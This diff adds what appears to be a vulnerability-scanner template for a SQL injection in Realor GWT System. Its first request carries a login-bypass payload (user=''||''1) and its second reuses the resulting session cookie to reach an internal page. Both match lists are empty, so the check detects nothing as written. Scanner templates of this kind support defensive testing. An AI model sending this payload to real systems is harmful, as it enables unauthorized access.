@@ -1,0 +1,21 @@
+id: realor-gwt-system-sqli
+brief:
+    title: Realor GWT System SQL injection
+    by: SleepingBag945
+    level: high
+    about: Realor GWT System system improperly handles the security of data passed by users, resulting in a SQL injection vulnerability. Remote and unauthorized attackers can use this vulnerability to obtain ...
+    label:
+        - realor
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/AgentBoard.XGI?user=''||''1&cmd=UserLogin'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Board.XGI'
+      head:
+        Cookie: PHPSESSID={{cookie}}
+      signs: []
